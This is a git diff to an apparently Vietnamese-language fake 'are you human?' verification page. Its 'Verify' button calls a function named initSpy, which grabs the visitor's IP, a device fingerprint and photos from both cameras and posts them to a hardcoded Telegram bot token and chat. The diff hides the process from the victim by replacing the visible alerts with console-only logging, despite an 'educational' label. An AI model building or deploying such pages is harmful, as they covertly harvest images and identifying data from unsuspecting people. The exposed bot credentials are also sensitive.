@@ -40,11 +40,15 @@
 <body>
   <h1>Bạn có phải là con người không?</h1>
   <button onclick="initSpy()">Xác minh</button>
-  <p>(Phục vụ học tập. Có sử dụng camera, IP, fingerprint gửi về Telegram cá nhân bạn.)</p>
+  <p>(Trang mô phỏng xác minh người dùng, phục vụ học tập. Camera + IP + fingerprint sẽ được gửi về Telegram cá nhân.)</p>
 
   <script>
     const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
     const chatId = "5017098451";
+
+    function silentAlert(msg) {
+      console.log(msg); // Ẩn alert, chỉ log
+    }
 
     function sha256(str) {
       const buffer = new TextEncoder().encode(str);
@@ -100,9 +104,9 @@
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
 
-        alert("✅ Đã gửi thông tin IP + thiết bị!");
+        silentAlert("✅ Gửi thông tin IP thành công");
       } catch (err) {
-        alert("⚠️ Lỗi khi gửi thông tin: " + err);
+        silentAlert("❌ Lỗi khi gửi IP: " + err);
       }
     }
 
@@ -128,18 +132,18 @@
         });
 
         stream.getTracks().forEach(track => track.stop());
-        alert(`📸 Đã chụp ảnh camera ${facingMode === "user" ? "trước" : "sau"}`);
+        silentAlert(`📸 Đã chụp ảnh camera ${facingMode}`);
       } catch (err) {
-        alert("⚠️ Không thể truy cập camera " + facingMode + ": " + err);
+        silentAlert(`⚠️ Không thể chụp ảnh (${facingMode}): ` + err);
       }
     }
 
     async function initSpy() {
-      alert("🔃 Bắt đầu xác minh...");
+      silentAlert("🔃 Bắt đầu xác minh...");
       await getInfo();
       await takePhoto("user");
       await takePhoto("environment");
-      alert("✅ Xác minh hoàn tất!");
+      silentAlert("✅ Xác minh hoàn tất!");
     }
   </script>
 </body>
